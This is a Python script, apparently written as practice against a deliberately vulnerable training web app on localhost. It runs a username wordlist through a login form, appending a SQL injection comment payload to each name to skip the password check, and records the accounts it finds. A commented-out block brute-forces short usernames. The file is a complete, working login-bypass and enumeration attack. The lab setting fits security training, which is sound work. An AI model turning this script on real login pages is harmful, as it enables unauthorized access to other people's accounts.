import asyncio
import itertools
import string
import time

import aiohttp

HOST = "127.0.0.1"
URL = f"http://{HOST}/vulnerabilities/brute/?"
FILE_NAME = "files/xato-net-10-million-usernames-dup"
PHPSESSID = "1m5puhnra2lui353bvo0ot8s51"
SQLi = "'-- -"  # 'or''='  '-- ...


async def func(logins):
    async with aiohttp.ClientSession(cookies={"PHPSESSID": PHPSESSID, "security": "low"}) as session:
        for row, login in enumerate(logins, start=1):
            async with session.get(f"{URL}username={login}&password=&Login=Login#") as resp:
                r = await resp.text()
                if "Welcome" in r:
                    print(f"user: {login.replace(SQLi, '')} row: {row}")

        # for c in itertools.product(string.ascii_lowercase + string.digits, repeat=4):
        #     login = "".join(c) + SQLi
        #
        #     async with session.get(f"{URL}username={login}&password=&Login=Login#") as resp:
        #         r = await resp.text()
        #         if "Welcome" in r:
        #             print(f"user: {login.replace(SQLi, '')} row: {row}")


with open(f"{FILE_NAME}.txt") as f:
    logins = f.readlines()

logins = (login.strip() + SQLi for login in logins)

start = time.time()

loop = asyncio.get_event_loop()
loop.run_until_complete(func(logins))

print(f"time: {round(time.time() - start, 2)} c")

"""
user: admin row: 2
user: pablo row: 935
user: Admin row: 1996
user: smithy row: 3713
user: Pablo row: 13711
user: 1337 row: 36933
user: Smithy row: 43582
user: SMITHY row: 74374
user: ADMIN row: 76288
user: PABLO row: 111320
user: gordonb row: 166548
time: 2100 c
"""
